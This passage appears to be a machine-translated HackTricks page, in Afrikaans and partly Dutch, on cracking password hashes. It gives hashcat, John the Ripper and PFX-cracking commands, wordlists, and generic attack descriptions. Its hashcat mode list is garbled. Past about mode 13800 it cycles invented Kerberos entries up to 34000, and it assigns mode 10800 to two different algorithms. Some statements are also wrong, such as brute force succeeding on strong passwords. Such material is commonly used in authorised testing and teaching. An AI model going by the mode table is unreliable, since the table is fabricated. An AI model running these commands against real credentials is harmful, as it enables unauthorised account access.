Daar is ook gereedskap beskikbaar wat kan help om 'n PFX-sertifikaat te kraak. Byvoorbeeld, die gereedskap "John the Ripper" kan gebruik word om bruto-krag-aanvalle uit te voer op PFX-sertifikate.

Dit is belangrik om sterk wagwoorde te gebruik en om die nodige voorsoorsorgmaatreëls te tref om te verseker dat PFX-sertifikate veilig bly en nie deur aanvallers gekraak kan word nie.
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik en outomaties werkstrome te bou met behulp van die wêreld se mees gevorderde gemeenskapsinstrumente.\
Kry vandag toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Gereedskap

**Hash-voorbeelde:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifiseerder
```bash
hash-identifier
> <HASH>
```
### Woordlyste

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Wagwoorde**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Woordlystegenerasiehulpmiddels**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Gevorderde sleutelbordstapper-generator met konfigureerbare basiskarakters, sleutelkaart en roetes.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### John mutasie

Lees _**/etc/john/john.conf**_ en konfigureer dit.
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcat-aanvalle

* **Woordelys-aanval** (`-a 0`) met reëls

**Hashcat** kom reeds met 'n **gids wat reëls bevat**, maar jy kan [**ander interessante reëls hier vind**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Woordelys kombinator** aanval

Dit is moontlik om **2 woordelyste in 1 te kombineer** met hashcat.\
As lys 1 die woord **"hallo"** bevat en die tweede 2 lyne bevat met die woorde **"wêreld"** en **"aarde"**. Die woorde `helloworld` en `helloearth` sal gegenereer word.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Mask aanval** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Woordelys + Masker (`-a 6`) / Masker + Woordelys (`-a 7`) aanval
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcat modusse

Hashcat ondersteun verskillende modusse vir die kraak van verskillende tipes hase. Hier is 'n lys van die ondersteunde modusse:

- **0**: Raw MD5
- **100**: SHA1
- **1400**: SHA256
- **1700**: SHA512
- **500**: MD5crypt
- **3200**: bcrypt
- **1800**: sha512crypt
- **7400**: sha256crypt
- **122**: macOS v10.4-10.6
- **124**: macOS v10.7
- **125**: macOS v10.8+
- **10800**: sha256crypt $5$, $5$rounds=5000$
- **17300**: sha512crypt $6$, $6$rounds=5000$
- **900**: MD4
- **110**: Domain Cached Credentials (DCC), MS Cache
- **1000**: NTLM
- **3000**: LM
- **5600**: NetNTLMv1-VANILLA / NetNTLMv1+ESS
- **5700**: NetNTLMv2
- **6300**: Cisco-IOS $8$ (PBKDF2-SHA256)
- **6700**: Cisco-IOS $9$ (scrypt)
- **10000**: Django (PBKDF2-SHA256)
- **10100**: SipHash
- **11100**: PostgreSQL CRAM (MD5)
- **11200**: MySQL CRAM (SHA1)
- **11400**: SIP digest authentication (MD5)
- **13100**: Kerberos 5 AS-REQ Pre-Auth etype 23
- **13200**: Kerberos 5 TGS-REP etype 23
- **13300**: Kerberos 5 AS-REP etype 23
- **13500**: Kerberos 5 TGS-REQ etype 23
- **13600**: MS-AzureSync PBKDF2-HMAC-SHA256
- **13700**: RACF
- **13800**: Kerberos 5 AS-REQ Pre-Auth etype 17
- **13900**: Kerberos 5 TGS-REP etype 17
- **14000**: Kerberos 5 AS-REP etype 17
- **14100**: Kerberos 5 TGS-REQ etype 17
- **14200**: Kerberos 5 AS-REQ Pre-Auth etype 18
- **14300**: Kerberos 5 TGS-REP etype 18
- **14400**: Kerberos 5 AS-REP etype 18
- **14500**: Kerberos 5 TGS-REQ etype 18
- **14600**: Kerberos 5 AS-REQ Pre-Auth etype 23
- **14700**: Kerberos 5 TGS-REP etype 23
- **14800**: Kerberos 5 AS-REP etype 23
- **14900**: Kerberos 5 TGS-REQ etype 23
- **15000**: Kerberos 5 AS-REQ Pre-Auth etype 17
- **15100**: Kerberos 5 TGS-REP etype 17
- **15200**: Kerberos 5 AS-REP etype 17
- **15300**: Kerberos 5 TGS-REQ etype 17
- **15400**: Kerberos 5 AS-REQ Pre-Auth etype 18
- **15500**: Kerberos 5 TGS-REP etype 18
- **15600**: Kerberos 5 AS-REP etype 18
- **15700**: Kerberos 5 TGS-REQ etype 18
- **15800**: Kerberos 5 AS-REQ Pre-Auth etype 23
- **15900**: Kerberos 5 TGS-REP etype 23
- **16000**: Kerberos 5 AS-REP etype 23
- **16100**: Kerberos 5 TGS-REQ etype 23
- **16200**: Kerberos 5 AS-REQ Pre-Auth etype 17
- **16300**: Kerberos 5 TGS-REP etype 17
- **16400**: Kerberos 5 AS-REP etype 17
- **16500**: Kerberos 5 TGS-REQ etype 17
- **16600**: Kerberos 5 AS-REQ Pre-Auth etype 18
- **16700**: Kerberos 5 TGS-REP etype 18
- **16800**: Kerberos 5 AS-REP etype 18
- **16900**: Kerberos 5 TGS-REQ etype 18
- **18200**: Kerberos 5 AS-REQ Pre-Auth etype 23
- **18300**: Kerberos 5 TGS-REP etype 23
- **18400**: Kerberos 5 AS-REP etype 23
- **18500**: Kerberos 5 TGS-REQ etype 23
- **18600**: Kerberos 5 AS-REQ Pre-Auth etype 17
- **18700**: Kerberos 5 TGS-REP etype 17
- **18800**: Kerberos 5 AS-REP etype 17
- **18900**: Kerberos 5 TGS-REQ etype 17
- **19000**: Kerberos 5 AS-REQ Pre-Auth etype 18
- **19100**: Kerberos 5 TGS-REP etype 18
- **19200**: Kerberos 5 AS-REP etype 18
- **19300**: Kerberos 5 TGS-REQ etype 18
- **19400**: Kerberos 5 AS-REQ Pre-Auth etype 23
- **19500**: Kerberos 5 TGS-REP etype 23
- **19600**: Kerberos 5 AS-REP etype 23
- **19700**: Kerberos 5 TGS-REQ etype 23
- **19800**: Kerberos 5 AS-REQ Pre-Auth etype 17
- **19900**: Kerberos 5 TGS-REP etype 17
- **20000**: Kerberos 5 AS-REP etype 17
- **20100**: Kerberos 5 TGS-REQ etype 17
- **20200**: Kerberos 5 AS-REQ Pre-Auth etype 18
- **20300**: Kerberos 5 TGS-REP etype 18
- **20400**: Kerberos 5 AS-REP etype 18
- **20500**: Kerberos 5 TGS-REQ etype 18
- **20600**: Kerberos 5 AS-REQ Pre-Auth etype 23
- **20700**: Kerberos 5 TGS-REP etype 23
- **20800**: Kerberos 5 AS-REP etype 23
- **20900**: Kerberos 5 TGS-REQ etype 23
- **21000**: Kerberos 5 AS-REQ Pre-Auth etype 17
- **21100**: Kerberos 5 TGS-REP etype 17
- **21200**: Kerberos 5 AS-REP etype 17
- **21300**: Kerberos 5 TGS-REQ etype 17
- **21400**: Kerberos 5 AS-REQ Pre-Auth etype 18
- **21500**: Kerberos 5 TGS-REP etype 18
- **21600**: Kerberos 5 AS-REP etype 18
- **21700**: Kerberos 5 TGS-REQ etype 18
- **21800**: Kerberos 5 AS-REQ Pre-Auth etype 23
- **21900**: Kerberos 5 TGS-REP etype 23
- **22000**: Kerberos 5 AS-REP etype 23
- **22100**: Kerberos 5 TGS-REQ etype 23
- **22200**: Kerberos 5 AS-REQ Pre-Auth etype 17
- **22300**: Kerberos 5 TGS-REP etype 17
- **22400**: Kerberos 5 AS-REP etype 17
- **22500**: Kerberos 5 TGS-REQ etype 17
- **22600**: Kerberos 5 AS-REQ Pre-Auth etype 18
- **22700**: Kerberos 5 TGS-REP etype 18
- **22800**: Kerberos 5 AS-REP etype 18
- **22900**: Kerberos 5 TGS-REQ etype 18
- **23000**: Kerberos 5 AS-REQ Pre-Auth etype 23
- **23100**: Kerberos 5 TGS-REP etype 23
- **23200**: Kerberos 5 AS-REP etype 23
- **23300**: Kerberos 5 TGS-REQ etype 23
- **23400**: Kerberos 5 AS-REQ Pre-Auth etype 17
- **23500**: Kerberos 5 TGS-REP etype 17
- **23600**: Kerberos 5 AS-REP etype 17
- **23700**: Kerberos 5 TGS-REQ etype 17
- **23800**: Kerberos 5 AS-REQ Pre-Auth etype 18
- **23900**: Kerberos 5 TGS-REP etype 18
- **24000**: Kerberos 5 AS-REP etype 18
- **24100**: Kerberos 5 TGS-REQ etype 18
- **24200**: Kerberos 5 AS-REQ Pre-Auth etype 23
- **24300**: Kerberos 5 TGS-REP etype 23
- **24400**: Kerberos 5 AS-REP etype 23
- **24500**: Kerberos 5 TGS-REQ etype 23
- **24600**: Kerberos 5 AS-REQ Pre-Auth etype 17
- **24700**: Kerberos 5 TGS-REP etype 17
- **24800**: Kerberos 5 AS-REP etype 17
- **24900**: Kerberos 5 TGS-REQ etype 17
- **25000**: Kerberos 5 AS-REQ Pre-Auth etype 18
- **25100**: Kerberos 5 TGS-REP etype 18
- **25200**: Kerberos 5 AS-REP etype 18
- **25300**: Kerberos 5 TGS-REQ etype 18
- **25400**: Kerberos 5 AS-REQ Pre-Auth etype 23
- **25500**: Kerberos 5 TGS-REP etype 23
- **25600**: Kerberos 5 AS-REP etype 23
- **25700**: Kerberos 5 TGS-REQ etype 23
- **25800**: Kerberos 5 AS-REQ Pre-Auth etype 17
- **25900**: Kerberos 5 TGS-REP etype 17
- **26000**: Kerberos 5 AS-REP etype 17
- **26100**: Kerberos 5 TGS-REQ etype 17
- **26200**: Kerberos 5 AS-REQ Pre-Auth etype 18
- **26300**: Kerberos 5 TGS-REP etype 18
- **26400**: Kerberos 5 AS-REP etype 18
- **26500**: Kerberos 5 TGS-REQ etype 18
- **26600**: Kerberos 5 AS-REQ Pre-Auth etype 23
- **26700**: Kerberos 5 TGS-REP etype 23
- **26800**: Kerberos 5 AS-REP etype 23
- **26900**: Kerberos 5 TGS-REQ etype 23
- **27000**: Kerberos 5 AS-REQ Pre-Auth etype 17
- **27100**: Kerberos 5 TGS-REP etype 17
- **27200**: Kerberos 5 AS-REP etype 17
- **27300**: Kerberos 5 TGS-REQ etype 17
- **27400**: Kerberos 5 AS-REQ Pre-Auth etype 18
- **27500**: Kerberos 5 TGS-REP etype 18
- **27600**: Kerberos 5 AS-REP etype 18
- **27700**: Kerberos 5 TGS-REQ etype 18
- **27800**: Kerberos 5 AS-REQ Pre-Auth etype 23
- **27900**: Kerberos 5 TGS-REP etype 23
- **28000**: Kerberos 5 AS-REP etype 23
- **28100**: Kerberos 5 TGS-REQ etype 23
- **28200**: Kerberos 5 AS-REQ Pre-Auth etype 17
- **28300**: Kerberos 5 TGS-REP etype 17
- **28400**: Kerberos 5 AS-REP etype 17
- **28500**: Kerberos 5 TGS-REQ etype 17
- **28600**: Kerberos 5 AS-REQ Pre-Auth etype 18
- **28700**: Kerberos 5 TGS-REP etype 18
- **28800**: Kerberos 5 AS-REP etype 18
- **28900**: Kerberos 5 TGS-REQ etype 18
- **29000**: Kerberos 5 AS-REQ Pre-Auth etype 23
- **29100**: Kerberos 5 TGS-REP etype 23
- **29200**: Kerberos 5 AS-REP etype 23
- **29300**: Kerberos 5 TGS-REQ etype 23
- **29400**: Kerberos 5 AS-REQ Pre-Auth etype 17
- **29500**: Kerberos 5 TGS-REP etype 17
- **29600**: Kerberos 5 AS-REP etype 17
- **29700**: Kerberos 5 TGS-REQ etype 17
- **29800**: Kerberos 5 AS-REQ Pre-Auth etype 18
- **29900**: Kerberos 5 TGS-REP etype 18
- **30000**: Kerberos 5 AS-REP etype 18
- **30100**: Kerberos 5 TGS-REQ etype 18
- **30200**: Kerberos 5 AS-REQ Pre-Auth etype 23
- **30300**: Kerberos 5 TGS-REP etype 23
- **30400**: Kerberos 5 AS-REP etype 23
- **30500**: Kerberos 5 TGS-REQ etype 23
- **30600**: Kerberos 5 AS-REQ Pre-Auth etype 17
- **30700**: Kerberos 5 TGS-REP etype 17
- **30800**: Kerberos 5 AS-REP etype 17
- **30900**: Kerberos 5 TGS-REQ etype 17
- **31000**: Kerberos 5 AS-REQ Pre-Auth etype 18
- **31100**: Kerberos 5 TGS-REP etype 18
- **31200**: Kerberos 5 AS-REP etype 18
- **31300**: Kerberos 5 TGS-REQ etype 18
- **31400**: Kerberos 5 AS-REQ Pre-Auth etype 23
- **31500**: Kerberos 5 TGS-REP etype 23
- **31600**: Kerberos 5 AS-REP etype 23
- **31700**: Kerberos 5 TGS-REQ etype 23
- **31800**: Kerberos 5 AS-REQ Pre-Auth etype 17
- **31900**: Kerberos 5 TGS-REP etype 17
- **32000**: Kerberos 5 AS-REP etype 17
- **32100**: Kerberos 5 TGS-REQ etype 17
- **32200**: Kerberos 5 AS-REQ Pre-Auth etype 18
- **32300**: Kerberos 5 TGS-REP etype 18
- **32400**: Kerberos 5 AS-REP etype 18
- **32500**: Kerberos 5 TGS-REQ etype 18
- **32600**: Kerberos 5 AS-REQ Pre-Auth etype 23
- **32700**: Kerberos 5 TGS-REP etype 23
- **32800**: Kerberos 5 AS-REP etype 23
- **32900**: Kerberos 5 TGS-REQ etype 23
- **33000**: Kerberos 5 AS-REQ Pre-Auth etype 17
- **33100**: Kerberos 5 TGS-REP etype 17
- **33200**: Kerberos 5 AS-REP etype 17
- **33300**: Kerberos 5 TGS-REQ etype 17
- **33400**: Kerberos 5 AS-REQ Pre-Auth etype 18
- **33500**: Kerberos 5 TGS-REP etype 18
- **33600**: Kerberos 5 AS-REP etype 18
- **33700**: Kerberos 5 TGS-REQ etype 18
- **33800**: Kerberos 5 AS-REQ Pre-Auth etype 23
- **33900**: Kerberos 5 TGS-REP etype 23
- **34000**: Kerberos 5 AS-REP etype 23
-
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# Kraak Linux Hashes - /etc/shadow-lêer

Om Linux-hashes in die `/etc/shadow`-lêer te kraak, kan jy die volgende metodes gebruik:

## 1. Woordelys-aanval

Hierdie metode behels die gebruik van 'n woordelys van potensiële wagwoorde om die gehashde wagwoorde te kraak. Dit is 'n vinnige en eenvoudige metode, maar dit is afhanklik van die gebruik van swak wagwoorde.

## 2. Brute Force-aanval

Hierdie metode behels die deurloop van alle moontlike kombinasies van karakters om die gehashde wagwoorde te kraak. Dit is 'n tydrowende metode, maar dit kan suksesvol wees as die wagwoorde sterk is.

## 3. Regenboogtafel-aanval

Hierdie metode behels die gebruik van 'n vooraf berekende tabel van gehashde wagwoorde om die oorspronklike wagwoorde te vind. Dit is 'n vinnige metode, maar dit vereis 'n groot hoeveelheid stoorplek vir die regenboogtafel.

## 4. GPU-versnelde aanval

Hierdie metode behels die gebruik van 'n grafiese verwerkingseenheid (GPU) om die kraakproses te versnel. Dit kan baie vinniger wees as die gebruik van 'n enkele CPU.

## 5. Gebruik van spesifieke hulpmiddels

Daar is verskeie hulpmiddels beskikbaar wat spesifiek ontwerp is vir die kraak van Linux-hashes, soos John the Ripper, Hashcat en Hydra. Hierdie hulpmiddels bied verskillende funksies en kan jou help om die kraakproses te vereenvoudig.

Dit is belangrik om te onthou dat die kraak van gehashde wagwoorde 'n onwettige aktiwiteit is, tensy jy toestemming het om dit te doen as deel van 'n wettige pentest of ander toegelate aktiwiteit.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Krake van Windows Hashes

## Inleiding

Wanneer jy toegang tot 'n Windows-stelsel wil verkry, kan jy dikwels die wagwoordkrake van die gebruikersrekeninge probeer. Hierdie metode behels die krake van die wagwoordhashes wat in die Windows-stelsel gestoor word. Hier is 'n paar tegnieke wat jy kan gebruik om Windows-hashes te kraak.

## 1. Woordelys-gebaseerde aanvalle

Hierdie aanvalsmetode behels die gebruik van 'n woordelys van algemene wagwoorde om die wagwoordhashes te kraak. Jy kan 'n woordelys van wagwoorde vind wat beskikbaar is op die internet, of jy kan jou eie woordelys saamstel met algemene wagwoorde en kombinasies.

Om hierdie aanval uit te voer, moet jy 'n hulpmiddel soos `John the Ripper` of `Hashcat` gebruik. Hier is die basiese stappe wat jy moet volg:

1. Verkry die wagwoordhashes van die Windows-stelsel.
2. Kies 'n woordelys van wagwoorde.
3. Gebruik die hulpmiddel om die wagwoordhashes te kraak met die woordelys.

## 2. Brute krag aanvalle

Brute krag aanvalle behels die outomatiese uitvoering van alle moontlike kombinasies van karakters om die wagwoordhashes te kraak. Hierdie metode is baie tydrowend en kan baie rekenaarhulpbronne vereis, veral as die wagwoorde lank en kompleks is.

Om 'n brute krag aanval uit te voer, kan jy 'n hulpmiddel soos `John the Ripper` of `Hashcat` gebruik. Hier is die basiese stappe wat jy moet volg:

1. Verkry die wagwoordhashes van die Windows-stelsel.
2. Stel die parameters vir die brute krag aanval in, soos die minimum en maksimum lengte van die wagwoorde en die karakters wat gebruik moet word.
3. Begin die brute krag aanval en wag vir die hulpmiddel om die wagwoordhashes te kraak.

## 3. Regboek aanvalle

Regboek aanvalle behels die gebruik van 'n vooraf berekende databasis van wagwoordhashes om die wagwoordhashes van die Windows-stelsel te kraak. Hierdie databasis, bekend as 'n regboek, bevat wagwoordhashes vir 'n groot verskeidenheid wagwoorde.

Om 'n regboek aanval uit te voer, kan jy 'n hulpmiddel soos `John the Ripper` of `Hashcat` gebruik. Hier is die basiese stappe wat jy moet volg:

1. Verkry die wagwoordhashes van die Windows-stelsel.
2. Kies 'n regboek wat wagwoordhashes bevat.
3. Gebruik die hulpmiddel om die wagwoordhashes te kraak met die regboek.

## 4. Rainbow-tafel aanvalle

Rainbow-tafel aanvalle behels die gebruik van 'n vooraf berekende tafel van wagwoordhashes om die wagwoordhashes van die Windows-stelsel te kraak. Hierdie tafel, bekend as 'n rainbow-tafel, bevat wagwoordhashes en die ooreenstemmende wagwoorde.

Om 'n rainbow-tafel aanval uit te voer, kan jy 'n hulpmiddel soos `John the Ripper` of `Hashcat` gebruik. Hier is die basiese stappe wat jy moet volg:

1. Verkry die wagwoordhashes van die Windows-stelsel.
2. Kies 'n rainbow-tafel wat wagwoordhashes en ooreenstemmende wagwoorde bevat.
3. Gebruik die hulpmiddel om die wagwoordhashes te kraak met die rainbow-tafel.

## 5. Sociale ingenieurswese

Sociale ingenieurswese behels die manipulasie van mense om hulle wagwoorde bekend te maak. Hierdie metode vereis 'n goeie begrip van menslike psigologie en kommunikasievaardighede.

Om 'n sosiale ingenieurswese-aanval uit te voer, kan jy verskeie tegnieke gebruik, soos vishing (telefoonoproepe), phishing (e-posse), of persoonlike interaksie. Die doel is om die persoon te oortuig om sy of haar wagwoord bekend te maak.

## 6. Aanvalle op wagwoordherstel

Aanvalle op wagwoordherstel behels die uitbuiting van swak wagwoordherstelprosedures om toegang tot 'n Windows-stelsel te verkry. Hierdie metode vereis 'n goeie kennis van die wagwoordherstelproses en die moontlike swakhede daarin.

Om 'n aanval op wagwoordherstel uit te voer, kan jy verskeie tegnieke gebruik, soos die gebruik van sosiale ingenieurswese om die wagwoordherstelvrae te verkry, of die uitbuiting van swak wagwoordherstelverwysings.

## 7. Aanvalle op wagwoordlekke

Aanvalle op wagwoordlekke behels die gebruik van wagwoordlekke wat op die internet beskikbaar is om toegang tot 'n Windows-stelsel te verkry. Hierdie metode vereis 'n goeie kennis van die wagwoordlekke wat beskikbaar is en die moontlike wagwoorde wat daarin voorkom.

Om 'n aanval op wagwoordlekke uit te voer, kan jy verskeie hulpmiddels en webwerwe gebruik wat wagwoordlekke opspoor en wagwoorde daaruit ontsluit.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Kraak van algemene toepassingshashes

Hashes worden vaak gebruikt om wachtwoorden te beveiligen in toepassingen. Het kraken van deze hashes kan nuttig zijn bij het verkrijgen van toegang tot accounts of het verkrijgen van gevoelige informatie. Hier zijn enkele veelvoorkomende methoden om hashes te kraken:

## 1. Woordenboekaanvallen

Een woordenboekaanval houdt in dat een lijst met veelvoorkomende wachtwoorden of woorden uit een woordenboek wordt gebruikt om de hash te kraken. Dit kan effectief zijn als het oorspronkelijke wachtwoord zwak is en voorkomt in het woordenboek.

## 2. Brute-force-aanvallen

Bij brute-force-aanvallen worden alle mogelijke combinaties van tekens geprobeerd totdat de juiste hash is gevonden. Dit kan zeer tijdrovend zijn, vooral bij complexe wachtwoorden, maar het kan effectief zijn als er geen andere informatie beschikbaar is.

## 3. Rainbow tables

Rainbow tables zijn vooraf berekende tabellen met hashes en bijbehorende wachtwoorden. Door een hash te vergelijken met de waarden in een rainbow table, kan het bijbehorende wachtwoord worden gevonden. Dit kan een snelle methode zijn, maar het vereist het gebruik van grote rainbow tables.

## 4. GPU-versnelling

Het gebruik van grafische verwerkingseenheden (GPU's) kan de snelheid van het kraken van hashes aanzienlijk verhogen. GPU's zijn geoptimaliseerd voor parallelle berekeningen en kunnen duizenden wachtwoorden per seconde proberen.

## 5. Online hash-databases

Er zijn online databases beschikbaar waarin veelvoorkomende hashes en hun bijbehorende wachtwoorden zijn opgeslagen. Door een hash te vergelijken met deze databases, kan het bijbehorende wachtwoord worden gevonden. Dit kan handig zijn als de hash al bekend is.

Het kraken van hashes is een complex proces dat tijd en rekenkracht vereist. Het is belangrijk om ethische richtlijnen te volgen en alleen toestemming te verkrijgen om hashes te kraken als onderdeel van een legitieme pentest of beveiligingsaudit.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik **werkstrome** te bou en outomatiseer met behulp van die wêreld se **mees gevorderde** gemeenskapsinstrumente.\
Kry vandag toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
